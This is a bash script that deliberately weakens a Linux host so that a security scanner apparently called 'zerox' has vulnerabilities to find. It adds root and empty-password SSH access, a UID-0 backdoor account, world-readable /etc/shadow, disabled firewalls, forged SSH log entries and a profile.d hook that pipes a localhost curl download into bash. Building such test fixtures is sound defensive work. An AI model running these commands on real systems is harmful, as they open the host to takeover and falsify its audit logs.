#!/usr/bin/env bash
set -euo pipefail

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
  echo "[FAIL] Run this script as root (sudo)." >&2
  exit 1
fi

echo "[WARN] This script intentionally weakens host security for scanner testing."

backup_file() {
  local target="$1"
  [[ -f "$target" ]] || return 0
  local backup="${target}.zerox.bak"
  [[ -f "$backup" ]] || cp -a "$target" "$backup"
}

set_or_add_directive() {
  local file="$1" key="$2" value="$3"
  [[ -f "$file" ]] || return 0
  backup_file "$file"
  if grep -Eq "^[[:space:]]*${key}[[:space:]]+" "$file"; then
    sed -i -E "s|^[[:space:]]*${key}[[:space:]]+.*$|${key} ${value}|g" "$file"
  else
    printf "%s %s\n" "$key" "$value" >>"$file"
  fi
}

append_if_missing() {
  local file="$1" line="$2"
  grep -Fqx "$line" "$file" 2>/dev/null || printf "%s\n" "$line" >>"$file"
}

relax_file_mode() {
  local path="$1" mode="$2"
  [[ -e "$path" ]] || return 0
  chmod "$mode" "$path" || true
}

echo "[INFO] Weakening SSH configuration..."
set_or_add_directive "/etc/ssh/sshd_config" "PasswordAuthentication" "yes"
set_or_add_directive "/etc/ssh/sshd_config" "PermitRootLogin" "yes"
set_or_add_directive "/etc/ssh/sshd_config" "PermitEmptyPasswords" "yes"
systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null || true

echo "[INFO] Adding vulnerable sudoers rules..."
mkdir -p /etc/sudoers.d
cat >/etc/sudoers.d/zerox-vuln <<'EOF'
zeroxuid0 ALL=(ALL:ALL) NOPASSWD: ALL
zeroxempty ALL=(ALL:ALL) /usr/bin/*
EOF
chmod 0440 /etc/sudoers.d/zerox-vuln

echo "[INFO] Creating weak identity state..."
id zeroxuid0 >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M -N -s /bin/bash zeroxuid0 || true
id zeroxempty >/dev/null 2>&1 || useradd -M -N -s /usr/sbin/nologin zeroxempty || true
passwd -d zeroxempty >/dev/null 2>&1 || true

for pam_file in /etc/pam.d/common-password /etc/pam.d/system-auth /etc/pam.d/password-auth; do
  [[ -f "$pam_file" ]] || continue
  backup_file "$pam_file"
  sed -i -E 's/^([^#].*pam_pwquality\.so.*)$/# \1/g' "$pam_file"
  sed -i -E 's/^([^#].*pam_faillock\.so.*)$/# \1/g' "$pam_file"
  sed -i -E 's/^([^#].*pam_tally2\.so.*)$/# \1/g' "$pam_file"
done

echo "[INFO] Weakening filesystem and scheduler artifacts..."
relax_file_mode "/etc/shadow" 0644
relax_file_mode "/etc/passwd" 0666
relax_file_mode "/boot/grub/grub.cfg" 0644
relax_file_mode "/boot/grub2/grub.cfg" 0644

cat >/usr/local/bin/zerox-world-writable.sh <<'EOF'
#!/usr/bin/env bash
echo "insecure scheduled payload"
EOF
chmod 0777 /usr/local/bin/zerox-world-writable.sh

cat >/etc/cron.d/zerox-insecure <<'EOF'
* * * * * root /usr/local/bin/zerox-world-writable.sh
EOF
chmod 0666 /etc/cron.d/zerox-insecure

echo "[INFO] Weakening persistence surfaces..."
mkdir -p /etc/profile.d
cat >/etc/profile.d/zerox-persist.sh <<'EOF'
#!/usr/bin/env bash
curl -fsSL http://127.0.0.1/payload.sh | bash
/tmp/zerox-world-writable.sh
EOF
chmod 0777 /etc/profile.d/zerox-persist.sh

backup_file /etc/ld.so.preload
touch /etc/ld.so.preload
# Keep the artifact writable but avoid injecting a missing preload library path,
# which triggers noisy ld.so loader errors across normal command execution.
chmod 0666 /etc/ld.so.preload || true

echo "[INFO] Applying insecure kernel/network sysctl values..."
sysctl -w kernel.randomize_va_space=0 >/dev/null 2>&1 || true
sysctl -w fs.suid_dumpable=1 >/dev/null 2>&1 || true
sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1 || true
sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true
sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1 || true
sysctl -w net.ipv6.conf.all.disable_ipv6=0 >/dev/null 2>&1 || true

touch /etc/sysctl.conf
append_if_missing /etc/sysctl.conf "kernel.randomize_va_space = 0"
append_if_missing /etc/sysctl.conf "fs.suid_dumpable = 1"
append_if_missing /etc/sysctl.conf "net.ipv4.conf.all.rp_filter = 0"
append_if_missing /etc/sysctl.conf "net.ipv4.ip_forward = 1"
append_if_missing /etc/sysctl.conf "net.ipv4.icmp_echo_ignore_all = 0"
append_if_missing /etc/sysctl.conf "net.ipv6.conf.all.disable_ipv6 = 0"

echo "[INFO] Making module policy insecure..."
rm -f /etc/modprobe.d/zerox-deny.conf
for module in usb_storage sctp tipc dccp; do
  modprobe "$module" >/dev/null 2>&1 || true
done

echo "[INFO] Weakening firewall/risky-service state..."
ufw disable >/dev/null 2>&1 || true
systemctl stop firewalld >/dev/null 2>&1 || true
systemctl disable firewalld >/dev/null 2>&1 || true
nft flush ruleset >/dev/null 2>&1 || true
iptables -P INPUT ACCEPT >/dev/null 2>&1 || true
iptables -P FORWARD ACCEPT >/dev/null 2>&1 || true
iptables -P OUTPUT ACCEPT >/dev/null 2>&1 || true

for service in cups.service avahi-daemon.service telnet.socket vsftpd.service rpcbind.service; do
  systemctl start "$service" >/dev/null 2>&1 || true
done

echo "[INFO] Injecting auth-log anomalies..."
if command -v logger >/dev/null 2>&1; then
  logger "sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4001 ssh2"
  logger "sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4002 ssh2"
  logger "sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4003 ssh2"
  logger "sshd[2222]: Accepted password for root from 203.0.113.77 port 4444 ssh2"
  logger "sshd[2222]: Accepted password for demo from 203.0.113.88 port 5555 ssh2"
fi

for auth_file in /var/log/auth.log /var/log/secure; do
  [[ -f "$auth_file" ]] || continue
  {
    echo "Apr 23 03:00:00 zerox sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4001 ssh2"
    echo "Apr 23 03:00:01 zerox sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4002 ssh2"
    echo "Apr 23 03:00:02 zerox sshd[2222]: Failed password for invalid user admin from 203.0.113.55 port 4003 ssh2"
    echo "Apr 23 03:00:03 zerox sshd[2222]: Accepted password for root from 203.0.113.77 port 4444 ssh2"
    echo "Apr 23 03:00:04 zerox sshd[2222]: Accepted password for demo from 203.0.113.88 port 5555 ssh2"
  } >>"$auth_file"
done

echo "[INFO] Forcing policy-based scans into warn/fail paths..."
cat >zerox_policy.json <<'EOF'
{
  "expected_ports": [1],
  "expected_services": ["definitely-not-running.service"],
  "tls_targets": ["127.0.0.1:1"],
  "high_risk_modules": ["usb_storage", "sctp", "tipc", "dccp"],
  "auth_failed_threshold": 1,
  "admin_login_hours": { "start": 9, "end": 10 },
  "allowed_startup_entries": []
}
EOF
rm -f zerox_baseline.json

echo
echo "[DONE] Vulnerable test posture is applied."
echo "[INFO] Run scanner from repo root with:"
echo "       python3 src/zerox.py --full --policy ./zerox_policy.json"
